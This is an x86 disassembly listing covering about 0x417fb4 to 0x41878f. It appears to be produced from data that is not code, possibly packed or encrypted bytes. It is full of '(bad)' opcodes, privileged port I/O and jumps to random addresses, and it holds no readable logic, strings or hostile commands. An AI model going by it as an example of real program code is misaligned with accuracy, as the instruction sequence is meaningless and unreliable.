  417fb4:	sub    ebx,0x867d918d
  417fba:	push   ss
  417fbb:	loopne 0x417fdc
  417fbd:	dec    ebp
  417fbe:	push   eax
  417fbf:	and    esi,DWORD PTR [esi]
  417fc1:	loope  0x417fdd
  417fc3:	adc    BYTE PTR [ecx],0x60
  417fc6:	mov    ebp,ebp
  417fc8:	in     eax,0x1b
  417fca:	add    al,0x34
  417fcc:	cmp    eax,0x570f0ee1
  417fd1:	xor    eax,0xa45e5ea5
  417fd6:	cmp    BYTE PTR [ecx+0x52],0xa7
  417fda:	stos   BYTE PTR es:[edi],al
  417fdb:	data16 sahf 
  417fdd:	jle    0x417fe1
  417fdf:	test   DWORD PTR [eax+0x10],0xc06a0884
  417fe6:	adc    al,0x12
  417fe8:	mov    ah,0xa6
  417fea:	pop    es
  417feb:	test   DWORD PTR [ebx-0x1e],ebp
  417fee:	jns    0x417ff2
  417ff0:	das    
  417ff1:	pop    ebx
  417ff2:	jmp    0x417fad
  417ff4:	jb     0x417f94
  417ff6:	adc    ah,BYTE PTR [edx-0x61da4ef4]
  417ffc:	fdiv   DWORD PTR [ebx]
  417ffe:	(bad)  
  417fff:	pushf  
  418000:	mov    esp,0x1749c60a
  418005:	dec    esp
  418006:	rcl    BYTE PTR [eax],cl
  418008:	into   
  418009:	mov    WORD PTR [ebp+0x6d],ss
  41800c:	mov    esp,DWORD PTR [ecx+0x39ea79b4]
  418012:	dec    esi
  418013:	xor    ebp,esp
  418015:	mov    edx,0xe25bd356
  41801a:	loopne 0x418068
  41801c:	xor    al,BYTE PTR [eax+ebp*2]
  41801f:	lds    eax,FWORD PTR [esi+0x6b]
  418022:	imul   edx,esi,0xffffff98
  418025:	out    dx,eax
  418026:	mov    DWORD PTR [edi+ebp*4],ebx
  418029:	lods   eax,DWORD PTR ds:[esi]
  41802a:	repnz mov bh,0x3f
  41802d:	add    al,0x5f
  41802f:	std    
  418030:	in     eax,dx
  418031:	adc    DWORD PTR [eax-0x36],edi
  418034:	xor    DWORD PTR [ecx+0x57],edi
  418037:	mov    bl,0x62
  418039:	sub    BYTE PTR [edx-0x48],cl
  41803c:	sub    DWORD PTR [esi+edx*2-0x596f0169],edi
  418043:	jg     0x417fd9
  418045:	pop    ebx
  418046:	ret    
  418047:	and    ebx,0x86ce6594
  41804d:	xlat   BYTE PTR ds:[ebx]
  41804e:	ss mov ebx,0x5c48ce00
  418054:	(bad)  
  418055:	and    edx,DWORD PTR [edx+0x6f]
  418058:	xchg   bh,cl
  41805a:	mov    ds:0x5659b09b,al
  41805f:	dec    ebx
  418060:	lods   al,BYTE PTR ds:[esi]
  418061:	push   edx
  418062:	gs fwait
  418064:	pusha  
  418065:	lock sbb esp,DWORD PTR [eax-0x39459e21]
  41806c:	nop
  41806d:	jge    0x41801a
  41806f:	sahf   
  418070:	in     al,0xc7
  418072:	add    ah,BYTE PTR [edx]
  418074:	scas   al,BYTE PTR es:[edi]
  418075:	int    0x97
  418077:	fiadd  DWORD PTR [edx]
  418079:	jmp    0xf2895c3c
  41807e:	sar    BYTE PTR [ebp+0x5a],1
  418081:	lar    edi,WORD PTR [ebx]
  418084:	test   DWORD PTR [edi-0x22],0xee42ed8f
  41808b:	cmp    esi,edx
  41808d:	(bad)
  418091:	shl    BYTE PTR [esi-0x3eb7d942],0x81
  418098:	stos   BYTE PTR es:[edi],al
  418099:	sbb    BYTE PTR [eax],ah
  41809b:	xchg   ebx,eax
  41809c:	inc    esp
  41809d:	mov    edx,0x3e814580
  4180a2:	jb     0x41805c
  4180a4:	ss ins DWORD PTR es:[edi],dx
  4180a6:	out    0xac,eax
  4180a8:	test   DWORD PTR [edi],0xf4101f1
  4180ae:	cli    
  4180af:	cmp    cl,BYTE PTR [ebx+eax*2+0xd4912c2]
  4180b6:	mov    bl,0x0
  4180b8:	lea    edi,[ebx-0x78]
  4180bb:	and    ebp,DWORD PTR [ebp+0x2fc2e09b]
  4180c1:	mov    bh,0x1f
  4180c3:	(bad)  
  4180c4:	daa    
  4180c5:	je     0x418083
  4180c7:	cdq    
  4180c8:	sbb    al,0xe0
  4180ca:	mov    ecx,DWORD PTR ds:0x24166373
  4180d0:	mov    esp,0x134c7726
  4180d5:	mov    eax,0x2c9772b8
  4180da:	mov    ax,0x2162
  4180de:	xor    al,BYTE PTR [ecx]
  4180e0:	xchg   ebp,eax
  4180e1:	loopne 0x4180c5
  4180e3:	scas   al,BYTE PTR es:[edi]
  4180e4:	repz mov cl,0x69
  4180e7:	mov    eax,0xea64f793
  4180ec:	stc    
  4180ed:	xchg   edi,eax
  4180ee:	shr    BYTE PTR [ebp+0x705113f2],1
  4180f4:	out    dx,eax
  4180f5:	or     al,0x53
  4180f7:	jne    0x4180b9
  4180f9:	test   eax,0x49adadf4
  4180fe:	mov    bl,BYTE PTR [ecx+edi*4]
  418101:	xchg   esp,eax
  418102:	sub    dh,bh
  418104:	inc    eax
  418105:	shr    DWORD PTR [ebx-0x2b91133e],cl
  41810b:	popf   
  41810c:	sub    eax,0xde608ea6
  418111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418112:	jmp    0x4180c7
  418114:	push   es
  418115:	pop    ebx
  418116:	(bad)  
  418117:	push   0x976360a7
  41811c:	test   ecx,0x4794c92f
  418122:	xchg   esp,eax
  418123:	mov    gs,WORD PTR fs:0x7b298e2e
  41812a:	xlat   BYTE PTR ds:[ebx]
  41812b:	adc    ch,BYTE PTR [ebx]
  41812d:	xchg   ebx,eax
  41812e:	pop    ss
  41812f:	sub    edx,edi
  418131:	sub    BYTE PTR [edi-0x75],bl
  418134:	fwait
  418135:	sbb    eax,0xbb5a8284
  41813a:	mov    eax,ds:0x219bc0da
  41813f:	pop    es
  418140:	cdq    
  418141:	jp     0x4181b6
  418143:	adc    BYTE PTR [ebp+0x2b],0x7e
  418147:	scas   eax,DWORD PTR es:[edi]
  418148:	je     0x418104
  41814a:	mov    bl,BYTE PTR [ebx]
  41814c:	cdq    
  41814d:	loope  0x418194
  41814f:	cwde   
  418150:	inc    ebp
  418151:	js     0x4181ce
  418153:	(bad)  
  418154:	cs mov edi,0x3a077052
  41815a:	xchg   BYTE PTR [ebx+ebp*2-0x59],al
  41815e:	inc    esi
  41815f:	inc    edi
  418160:	cs hlt 
  418162:	imul   ecx,ecx,0xb
  418165:	fcomp  QWORD PTR [eax-0x21]
  418168:	mov    bh,0x12
  41816a:	mov    esi,0x5fc31290
  41816f:	enter  0xf903,0x58
  418173:	jl     0x418179
  418175:	xor    eax,0xc70d33b
  41817a:	adc    bl,ch
  41817c:	(bad)  
  41817d:	pop    edi
  41817e:	inc    eax
  41817f:	jbe    0x41816b
  418181:	test   al,0x2
  418183:	pop    ss
  418184:	add    eax,0x856a0863
  418189:	mov    dh,0x2f
  41818b:	and    eax,0xaba831d1
  418190:	in     eax,dx
  418191:	inc    eax
  418192:	and    esi,0xf85006bd
  418198:	test   eax,0xdab8d3a5
  41819d:	popf   
  41819e:	sub    DWORD PTR [esi+eiz*1],edi
  4181a1:	and    al,0xa
  4181a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181a4:	sub    al,0x33
  4181a6:	std    
  4181a7:	fmul   st(5),st
  4181a9:	pop    ebx
  4181aa:	jno    0x418139
  4181ac:	rcr    BYTE PTR [ecx+esi*4+0x2986e3e],cl
  4181b3:	out    dx,eax
  4181b4:	icebp  
  4181b5:	aaa    
  4181b6:	pop    eax
  4181b7:	xor    eax,0xbe1aa609
  4181bc:	or     DWORD PTR [ecx-0x60f8ece0],esi
  4181c2:	ja     0x418204
  4181c4:	test   eax,0xa6b16114
  4181c9:	in     eax,dx
  4181ca:	push   es
  4181cb:	sub    bh,al
  4181cd:	mov    eax,0xcec7c0bc
  4181d2:	jno    0x418199
  4181d4:	sti    
  4181d5:	jg     0x4181ae
  4181d7:	xchg   edi,eax
  4181d8:	push   ebx
  4181d9:	cmp    ecx,DWORD PTR [eax+0x9ddb0a1]
  4181df:	test   BYTE PTR [ebp+edx*8-0x2f],0x69
  4181e4:	stos   BYTE PTR es:[edi],al
  4181e5:	mov    ebp,cs
  4181e7:	jno    0x4181d8
  4181e9:	push   cs
  4181ea:	fmul   QWORD PTR [ebx+ebp*4]
  4181ed:	rol    DWORD PTR [esi],1
  4181ef:	scas   al,BYTE PTR es:[edi]
  4181f0:	or     eax,ecx
  4181f2:	pushf  
  4181f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181f4:	std    
  4181f5:	xor    al,0x5c
  4181f7:	push   cs
  4181f8:	fldenv [edx]
  4181fa:	mov    cl,0x7f
  4181fc:	and    BYTE PTR [ebx+0x308273cd],ah
  418202:	jbe    0x4181d6
  418204:	cmp    DWORD PTR [eax],0x2979b1e9
  41820a:	jg     0x41823e
  41820c:	cmp    BYTE PTR [ebx+ebp*8],dl
  41820f:	xor    bl,bl
  418211:	pop    edi
  418212:	xor    esp,0xffffff8d
  418215:	ins    BYTE PTR es:[edi],dx
  418216:	xlat   BYTE PTR ds:[ebx]
  418217:	loop   0x41823d
  418219:	ins    DWORD PTR es:[edi],dx
  41821a:	push   ebx
  41821b:	lahf   
  41821c:	sub    BYTE PTR [ebp+0xce1947a],bh
  418222:	pop    ecx
  418223:	mov    eax,0xe8584a73
  418228:	icebp  
  418229:	sub    BYTE PTR [eax+0x30],bh
  41822c:	xchg   edi,eax
  41822d:	out    dx,eax
  41822e:	pop    ecx
  41822f:	ins    BYTE PTR es:[edi],dx
  418230:	or     ebx,DWORD PTR [ebx-0x2298ecf5]
  418236:	and    eax,0xeff381b4
  41823b:	scas   al,BYTE PTR es:[edi]
  41823c:	sti    
  41823d:	xor    BYTE PTR [edx-0x13],dh
  418240:	test   BYTE PTR [ebx+0x51],0x9b
  418244:	jbe    0x418245
  418246:	outs   dx,DWORD PTR ds:[esi]
  418247:	mov    ecx,0xf3ab7b12
  41824c:	sub    DWORD PTR [esi-0x20448e0],edi
  418252:	hlt    
  418253:	add    edi,edi
  418255:	mov    ah,0xf0
  418257:	retf   0xd010
  41825a:	jb     0x41829a
  41825c:	mov    dl,ah
  41825e:	push   eax
  41825f:	dec    edi
  418260:	mov    ebp,0x47f70ec8
  418265:	mov    al,ds:0x3711ac43
  41826a:	sub    DWORD PTR [eax-0x3d489c44],edx
  418270:	adc    al,0xaf
  418272:	mov    ?,WORD PTR [edx-0x3c]
  418275:	push   es
  418276:	dec    edx
  418277:	clc    
  418278:	loope  0x41828b
  41827a:	loope  0x4182d8
  41827c:	test   DWORD PTR [ecx],esp
  41827e:	mov    bl,0x7c
  418280:	mov    cl,0x87
  418282:	or     eax,0x73616364
  418287:	add    BYTE PTR [edi+0x57],dl
  41828a:	imul   esi,DWORD PTR cs:[ebp-0x30],0x3a
  41828f:	lods   al,BYTE PTR ds:[esi]
  418290:	sub    ecx,DWORD PTR [esi+0x4edcdf9a]
  418296:	stos   DWORD PTR es:[edi],eax
  418297:	push   ebp
  418298:	push   0xffffff9f
  41829a:	in     al,dx
  41829b:	cld    
  41829c:	addr16 jmp 0x4182d3
  41829f:	call   0x49d953e4
  4182a4:	mov    ah,0x3c
  4182a6:	pop    ebx
  4182a7:	int3   
  4182a8:	mov    al,BYTE PTR [ebx+0x25]
  4182ab:	mov    DWORD PTR [edx],edi
  4182ad:	or     eax,0xdfef8323
  4182b2:	mov    ch,BYTE PTR [ebp-0x16a608f0]
  4182b8:	mov    ebx,0x1728b956
  4182bd:	cmp    esi,DWORD PTR [esi+ecx*8+0x6]
  4182c1:	rol    BYTE PTR [eax],cl
  4182c3:	nop
  4182c4:	ret    
  4182c5:	icebp  
  4182c6:	cs cmp eax,0xfa2dc6d4
  4182cc:	mov    ds:0x88c70580,al
  4182d1:	dec    ecx
  4182d2:	fstp   TBYTE PTR [ebx]
  4182d4:	fbld   TBYTE PTR [eax+0x259d5d65]
  4182da:	or     BYTE PTR [edi+esi*2-0x214247e2],0xb7
  4182e2:	sub    al,0xbb
  4182e4:	mov    ah,BYTE PTR [esi]
  4182e6:	push   esp
  4182e7:	ja     0x41830f
  4182e9:	or     DWORD PTR [eax],ebp
  4182eb:	adc    al,0x78
  4182ed:	cmp    al,bl
  4182ef:	nop
  4182f0:	and    esi,DWORD PTR [edx+0x50]
  4182f3:	xor    esi,DWORD PTR [edx]
  4182f5:	iret   
  4182f6:	sub    eax,0xbeb8b610
  4182fb:	add    al,0x29
  4182fd:	add    BYTE PTR [esi],bl
  4182ff:	call   0x319445f2
  418304:	xchg   ecx,eax
  418305:	add    ch,BYTE PTR [ebp+ebx*8+0x487f1815]
  41830c:	mov    ds:0x7b7e4a94,al
  418311:	pop    ebp
  418312:	inc    ecx
  418313:	mov    ds:0xe6eef510,al
  418318:	pusha  
  418319:	inc    ebx
  41831a:	fwait
  41831b:	push   esp
  41831c:	shl    BYTE PTR [ecx],cl
  41831e:	inc    eax
  41831f:	popa   
  418320:	dec    edx
  418321:	jg     0x41839d
  418323:	scas   eax,DWORD PTR es:[edi]
  418324:	dec    esp
  418325:	outs   dx,BYTE PTR ds:[esi]
  418326:	jg     0x41836c
  418328:	ret    
  418329:	fcom   QWORD PTR [ebp-0x2c7d3dc]
  41832f:	mov    edi,0xb2a4e92b
  418334:	ins    BYTE PTR es:[edi],dx
  418335:	jae    0x418356
  418337:	imul   esi,DWORD PTR [esi-0x67952d4c],0x4e316069
  418341:	sub    BYTE PTR [edi+0xc],dl
  418344:	sbb    al,0x8b
  418346:	jecxz  0x4183c4
  418348:	es out 0x16,eax
  41834b:	add    bl,BYTE PTR [esi-0x61]
  41834e:	jae    0x4182e0
  418350:	push   es
  418351:	into   
  418352:	rcl    ecx,0xcd
  418355:	test   al,0xd3
  418357:	jae    0x41837e
  418359:	or     al,0x3
  41835b:	ins    BYTE PTR es:[edi],dx
  41835c:	inc    esi
  41835d:	mov    bh,BYTE PTR [ecx-0x540c9c28]
  418363:	mov    ebp,0xd305ad0a
  418368:	leave  
  418369:	xchg   ebp,eax
  41836a:	aaa    
  41836b:	push   ebp
  41836c:	jae    0x418383
  41836e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41836f:	stc    
  418370:	mov    eax,0x64369b83
  418375:	pop    es
  418376:	rcr    BYTE PTR [ecx-0x412e060d],0xc
  41837d:	aad    0x9f
  41837f:	hlt    
  418380:	retf   
  418381:	inc    edx
  418382:	shr    DWORD PTR [esi-0x41],0x9c
  418386:	loop   0x41839f
  418388:	jno    0x418390
  41838a:	jno    0x4183b3
  41838c:	lahf   
  41838d:	(bad)  
  41838e:	sub    bh,dh
  418390:	in     al,dx
  418391:	std    
  418392:	sub    ch,ch
  418394:	pop    ebx
  418395:	add    bh,BYTE PTR [ecx+0x4d]
  418398:	in     eax,dx
  418399:	fnstcw WORD PTR [eax+0xd]
  41839c:	rcl    BYTE PTR [esi+0x34],cl
  41839f:	out    dx,eax
  4183a0:	add    eax,0x9978b415
  4183a5:	xor    esp,esp
  4183a7:	pusha  
  4183a8:	cmp    eax,0x27f1e5ee
  4183ad:	fisub  WORD PTR [ebx-0x39]
  4183b0:	push   esp
  4183b1:	inc    edx
  4183b2:	sar    ebp,1
  4183b4:	scas   al,BYTE PTR es:[edi]
  4183b5:	push   ds
  4183b6:	pop    edx
  4183b7:	jl     0x418364
  4183b9:	adc    ebx,DWORD PTR [ebp+0x472cfaf7]
  4183bf:	fsubr  st(4),st
  4183c1:	fbld   TBYTE PTR [edi-0x3f]
  4183c4:	data16 (bad) 
  4183c6:	das    
  4183c7:	jmp    DWORD PTR [eax]
  4183c9:	cmp    esi,DWORD PTR [ebp+0x671c19d6]
  4183cf:	xchg   edi,eax
  4183d0:	inc    edi
  4183d1:	fld    TBYTE PTR [eax+0x4578cd5]
  4183d7:	out    0xa2,al
  4183d9:	jo     0x41839d
  4183db:	mov    ds:0x37b12cc3,al
  4183e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183e1:	and    al,0x60
  4183e3:	mov    al,ds:0x2d33e3e6
  4183e8:	in     eax,dx
  4183e9:	(bad)  
  4183ea:	xchg   esp,eax
  4183eb:	outs   dx,DWORD PTR ds:[esi]
  4183ec:	and    dh,bl
  4183ee:	and    ebp,eax
  4183f0:	sub    BYTE PTR [ebp+0x1268295],ch
  4183f6:	je     0x41845d
  4183f8:	es push ss
  4183fa:	cs enter 0xd743,0x88
  4183ff:	mov    dh,0x23
  418401:	mov    DWORD PTR [ecx],esi
  418403:	or     DWORD PTR [edi+0x4],0x43
  418407:	push   edi
  418408:	fiadd  DWORD PTR [edi]
  41840a:	imul   ebp,DWORD PTR [edi+0x56],0x725f1967
  418411:	push   cs
  418412:	mov    esp,0x46303812
  418417:	push   esi
  418418:	adc    BYTE PTR [edx-0x1cd5c313],0xb1
  41841f:	xor    edx,DWORD PTR ds:0x8a8ce829
  418425:	jecxz  0x4183e7
  418427:	add    BYTE PTR [esi+0x7269d299],dh
  41842d:	pop    ebx
  41842e:	xlat   BYTE PTR ds:[ebx]
  41842f:	cli    
  418430:	cld    
  418431:	sbb    ebx,0xe3daf8d5
  418437:	repz sbb ebp,edi
  41843a:	dec    ebp
  41843b:	cwde   
  41843c:	rcl    DWORD PTR [ecx-0x36057adb],0x37
  418443:	cs (bad) 
  418445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418446:	sar    esp,1
  418448:	xchg   esi,eax
  418449:	add    BYTE PTR ds:0x2fcf618d,dh
  41844f:	jbe    0x4184c9
  418451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418453:	inc    eax
  418454:	xor    BYTE PTR [esi],bh
  418456:	fld    DWORD PTR [ebp+0x4ca78e4f]
  41845c:	cmp    BYTE PTR [eax-0x49],0x74
  418460:	aas    
  418461:	pop    esp
  418462:	mov    ds:0x7bcffc73,eax
  418467:	lmsw   WORD PTR [esi]
  41846a:	mov    bh,0x3c
  41846c:	cwde   
  41846d:	mov    eax,0xc23f70e7
  418472:	xor    eax,0xc1b20255
  418477:	sub    BYTE PTR [eax+0x62bbebc9],dl
  41847d:	ins    BYTE PTR es:[edi],dx
  41847e:	sbb    BYTE PTR [eax],ch
  418480:	inc    esp
  418481:	pop    ds
  418482:	dec    eax
  418483:	sub    ah,BYTE PTR [edx+0x671ef5e1]
  418489:	pop    eax
  41848a:	test   BYTE PTR [ecx],0xef
  41848d:	clc    
  41848e:	inc    esi
  41848f:	push   ebx
  418490:	dec    edx
  418491:	xchg   edi,eax
  418492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418493:	pop    esi
  418494:	(bad)  
  418495:	mov    al,0x21
  418497:	out    dx,al
  418498:	or     eax,0xc7501e08
  41849d:	sbb    eax,0xca907562
  4184a2:	push   ebp
  4184a3:	or     ah,ch
  4184a5:	cs push ebx
  4184a7:	test   eax,0x83e5432e
  4184ac:	pop    esi
  4184ad:	mov    al,0x8b
  4184af:	data16 fadd QWORD PTR [eax-0x1cdadeb5]
  4184b6:	js     0x418512
  4184b8:	cs sub bl,dh
  4184bb:	stos   BYTE PTR es:[edi],al
  4184bc:	inc    ebx
  4184bd:	lods   eax,DWORD PTR ds:[esi]
  4184be:	int3   
  4184bf:	dec    edi
  4184c0:	das    
  4184c1:	popa   
  4184c2:	leave  
  4184c3:	in     al,0xcf
  4184c5:	pop    esi
  4184c6:	xchg   ebp,eax
  4184c7:	mov    bl,0xf6
  4184c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184ca:	jmp    0x892e:0x3f2a7307
  4184d1:	adc    esp,DWORD PTR [eax]
  4184d3:	enter  0xd7e1,0x4
  4184d7:	push   ds
  4184d8:	enter  0x2563,0x96
  4184dc:	adc    ch,BYTE PTR [edi+eax*1]
  4184df:	mov    eax,ds:0x9b697991
  4184e4:	xchg   DWORD PTR [esp+eiz*8+0x7f],ecx
  4184e8:	sahf   
  4184e9:	ss jmp 0x418525
  4184ec:	ror    ah,0x5d
  4184ef:	retw   
  4184f1:	call   0x2bdd63eb
  4184f6:	ror    cl,1
  4184f8:	xlat   BYTE PTR ds:[ebx]
  4184f9:	mov    WORD PTR [edx-0xe],gs
  4184fc:	sbb    DWORD PTR [esi-0x1d],edx
  4184ff:	(bad)  
  418500:	js     0x4184cf
  418502:	sbb    eax,0x2e59a453
  418507:	hlt    
  418508:	std    
  418509:	int3   
  41850a:	out    0x33,eax
  41850c:	adc    BYTE PTR [bp+si],al
  41850f:	call   DWORD PTR [ebp-0x75933fa4]
  418515:	sahf   
  418516:	bound  edx,QWORD PTR ds:[esi]
  418519:	pop    ebx
  41851a:	mov    DWORD PTR [esi-0x27],eax
  41851d:	shl    BYTE PTR [esi-0x29],0x37
  418521:	ret    
  418522:	cmp    al,0xd0
  418524:	(bad)  
  418525:	mov    ch,0xa0
  418527:	jp     0x41850a
  418529:	test   al,0xcc
  41852b:	cmp    esi,eax
  41852d:	hlt    
  41852e:	(bad)  
  41852f:	std    
  418530:	xchg   ecx,eax
  418531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418532:	es std 
  418534:	fwait
  418535:	bound  esp,QWORD PTR [edi+0x3b]
  418538:	fst    QWORD PTR [ebp-0x6b]
  41853b:	cli    
  41853c:	sub    BYTE PTR [ebp-0xa874c52],bh
  418542:	test   eax,0x4bcd45aa
  418547:	push   edx
  418548:	(bad)  [eax+ebp*1]
  41854b:	sub    BYTE PTR [esi+0x385d29e3],0x41
  418552:	mov    esi,0x40ee5a4e
  418557:	test   BYTE PTR [ecx],ch
  418559:	mov    bh,0x52
  41855b:	or     BYTE PTR [ebx+0x47],ch
  41855e:	dec    ebp
  41855f:	lock and al,0x16
  418562:	in     eax,dx
  418563:	aaa    
  418564:	repz xor DWORD PTR [edi],ebx
  418567:	iret   
  418568:	(bad)  
  41856a:	and    BYTE PTR [edi-0x52b15dab],0xca
  418571:	xchg   ebx,eax
  418572:	or     bl,BYTE PTR [ebp+0x59e76ad6]
  418578:	lods   al,BYTE PTR ds:[esi]
  418579:	nop
  41857a:	add    ah,bh
  41857c:	cmp    dh,bl
  41857e:	int3   
  41857f:	aam    0x82
  418581:	hlt    
  418582:	iret   
  418583:	add    ch,BYTE PTR [ebx+0x65]
  418586:	cmp    al,bl
  418588:	add    ecx,DWORD PTR [edx]
  41858a:	repz mov edi,0xad0a2131
  418590:	or     DWORD PTR [esi],esp
  418592:	or     DWORD PTR [ecx],esi
  418594:	lods   al,BYTE PTR ds:[esi]
  418595:	mov    ch,BYTE PTR [edx-0x2ae54371]
  41859b:	adc    cl,BYTE PTR [edx]
  41859d:	inc    ebx
  41859e:	xor    DWORD PTR [ebx],ebx
  4185a0:	outs   dx,BYTE PTR ds:[esi]
  4185a1:	cld    
  4185a2:	test   al,0x7f
  4185a4:	mov    cl,0x29
  4185a6:	dec    edx
  4185a7:	dec    ecx
  4185a8:	push   0x7e14f6d4
  4185ad:	xchg   edx,eax
  4185ae:	xor    bh,al
  4185b0:	inc    esi
  4185b1:	mov    al,ds:0xf39432d4
  4185b6:	std    
  4185b7:	mov    DWORD PTR [edx+0x2fdef82e],0x15017c29
  4185c1:	and    bh,bl
  4185c3:	loop   0x418582
  4185c5:	clc    
  4185c6:	sub    al,0xc5
  4185c8:	iret   
  4185c9:	push   ebp
  4185ca:	test   cl,ch
  4185cc:	popa   
  4185cd:	mov    cl,0xe3
  4185cf:	ins    BYTE PTR es:[edi],dx
  4185d0:	lods   eax,DWORD PTR ds:[esi]
  4185d1:	inc    eax
  4185d2:	dec    edi
  4185d3:	test   DWORD PTR [eax+0x351c9155],0x8685efcf
  4185dd:	cdq    
  4185de:	imul   ebx,esp,0xc3752b33
  4185e4:	inc    ecx
  4185e5:	adc    eax,0x92602ca7
  4185ea:	imul   edx,ebp,0x2
  4185ed:	nop
  4185ee:	mov    DWORD PTR [edi-0x163e008e],edx
  4185f4:	and    BYTE PTR [edi+0x31],ch
  4185f7:	ins    DWORD PTR es:[edi],dx
  4185f8:	loop   0x418670
  4185fa:	jae    0x418631
  4185fc:	pop    edi
  4185fd:	int3   
  4185fe:	ds jb  0x418620
  418601:	mov    edx,0x4a0787c3
  418606:	mov    al,ch
  418608:	push   0x38a0347d
  41860d:	sbb    edx,DWORD PTR [ecx+0x51cd410a]
  418613:	jnp    0x4185eb
  418615:	sti    
  418616:	dec    eax
  418617:	push   esi
  418618:	ins    DWORD PTR es:[edi],dx
  418619:	fisttp DWORD PTR [ebx]
  41861b:	arpl   WORD PTR [esi+ebx*1-0x44b7d827],cx
  418622:	(bad)  
  418623:	(bad)  
  418624:	int    0xb2
  418626:	mov    es,esp
  418628:	data16 outs dx,BYTE PTR ss:[esi]
  41862b:	dec    ebx
  41862c:	test   eax,0xf9aeb79e
  418631:	clc    
  418632:	xchg   DWORD PTR [edi+eax*2],esp
  418635:	cdq    
  418636:	retf   
  418637:	dec    ebx
  418638:	inc    DWORD PTR [ebp+0x3da3a3d0]
  41863e:	pop    ds
  41863f:	mov    ss,ebp
  418641:	adc    DWORD PTR [ecx-0x8bb305d],esi
  418647:	add    eax,0x38246d3f
  41864c:	out    dx,eax
  41864d:	in     eax,dx
  41864e:	sub    edx,0xfffffffc
  418651:	in     eax,dx
  418652:	in     eax,0x1d
  418654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418655:	cli    
  418656:	sbb    cl,cl
  418658:	pop    es
  418659:	push   cs
  41865a:	loopne 0x4185f6
  41865c:	out    0xad,eax
  41865e:	shl    BYTE PTR [ecx-0x1a34b1de],1
  418664:	test   al,0xf7
  418666:	cld    
  418667:	repnz mov ax,ds:0xfed8a44b
  41866e:	rol    ecx,1
  418670:	pop    es
  418671:	arpl   WORD PTR [ebx+0x4c8b03c8],si
  418677:	sbb    esi,ebx
  418679:	jne    0x4186c7
  41867b:	jg     0x4186b0
  41867d:	inc    ebp
  41867e:	icebp  
  41867f:	loopne 0x4186fc
  418681:	imul   ebp,DWORD PTR [edi+0x70],0x2f
  418685:	add    eax,0xd0e5bd77
  41868a:	adc    DWORD PTR [eax-0x8e47be0],edi
  418690:	sub    ah,BYTE PTR [esi-0x50]
  418693:	das    
  418694:	sbb    cl,BYTE PTR [edx-0xbe497e1]
  41869a:	cmp    eax,0xac1f046d
  41869f:	icebp  
  4186a0:	icebp  
  4186a1:	and    eax,0x3c257836
  4186a6:	hlt    
  4186a7:	mov    eax,0xf478133b
  4186ac:	pusha  
  4186ad:	arpl   WORD PTR [ecx-0x75399df4],bp
  4186b3:	loope  0x41866e
  4186b5:	sbb    al,0x13
  4186b7:	push   ss
  4186b8:	sbb    BYTE PTR [ebp+0x18afef18],al
  4186be:	mov    esp,0x301f9dc7
  4186c3:	rcl    dl,0xa3
  4186c6:	xchg   ebp,eax
  4186c7:	into   
  4186c8:	in     al,dx
  4186c9:	ror    DWORD PTR gs:[eax+eiz*2-0xd],1
  4186ce:	mov    ds:0xd2c27b1e,eax
  4186d3:	sbb    dh,bl
  4186d5:	push   edi
  4186d6:	push   ecx
  4186d7:	or     DWORD PTR [ebx-0x5f60a54a],edx
  4186dd:	push   ds
  4186de:	(bad)  
  4186df:	popa   
  4186e0:	in     al,dx
  4186e1:	das    
  4186e2:	gs add al,0xfc
  4186e5:	js     0x418683
  4186e7:	stos   BYTE PTR es:[edi],al
  4186e8:	add    ch,ah
  4186ea:	xchg   esp,eax
  4186eb:	leave  
  4186ec:	add    edi,ebp
  4186ee:	shr    bh,cl
  4186f0:	cmp    bl,BYTE PTR [eax+edx*4]
  4186f3:	pop    ebp
  4186f4:	call   0xe6d3:0x54580b21
  4186fb:	inc    ebx
  4186fc:	sqrtps xmm2,XMMWORD PTR [edi+eiz*4]
  418700:	sar    BYTE PTR [eax],1
  418702:	jmp    0x418731
  418704:	xchg   esp,eax
  418705:	pop    eax
  418706:	add    al,0x59
  418708:	sahf   
  418709:	pop    ebp
  41870a:	test   DWORD PTR [ecx-0x3ddcc6ec],edx
  418710:	imul   edi,DWORD PTR [edx],0x44be82fe
  418716:	repnz mov bh,0xf4
  418719:	dec    esi
  41871a:	sub    cl,BYTE PTR [edx+0xcc91eda]
  418720:	shl    BYTE PTR fs:[esi+0x5695b1e3],0xe8
  418728:	sbb    esi,DWORD PTR [ecx-0x56]
  41872b:	popa   
  41872c:	iret   
  41872d:	shr    BYTE PTR [eax-0x50],cl
  418730:	jnp    0x418798
  418732:	mov    ds:0x7889e098,eax
  418737:	fisub  DWORD PTR [esi+ebx*8+0x681d4351]
  41873f:	ret    
  418740:	outs   dx,DWORD PTR ds:[esi]
  418741:	push   cs
  418742:	xchg   bx,ax
  418744:	not    BYTE PTR [esi]
  418746:	test   ecx,0x192e2c61
  41874c:	jle    0x41874e
  41874e:	dec    esi
  41874f:	mov    WORD PTR [ecx],ds
  418751:	iret   
  418752:	fdiv   QWORD PTR [edx]
  418754:	sbb    al,0x96
  418756:	push   esp
  418757:	mov    eax,ds:0x41d2bb38
  41875c:	push   0xffffff8b
  41875e:	cdq    
  41875f:	push   ebp
  418760:	mov    esp,0x99236e16
  418765:	ficom  WORD PTR [ebx+0x5c9b3231]
  41876b:	out    dx,al
  41876c:	adc    DWORD PTR [esi],esp
  41876e:	inc    eax
  41876f:	sbb    al,0x80
  418771:	mov    ah,0xf
  418773:	lds    esp,FWORD PTR [eax]
  418775:	inc    esp
  418776:	(bad)  
  418778:	enter  0x6944,0x63
  41877c:	gs xchg edx,eax
  41877e:	ret    0x3320
  418781:	call   0xeada65d8
  418786:	mov    cl,0xef
  418788:	addr16 mov ds:0x29e6,al
  41878c:	(bad)  
  41878d:	(bad)  [edx]
  41878f:	les    esp,FWORD PTR [ecx]
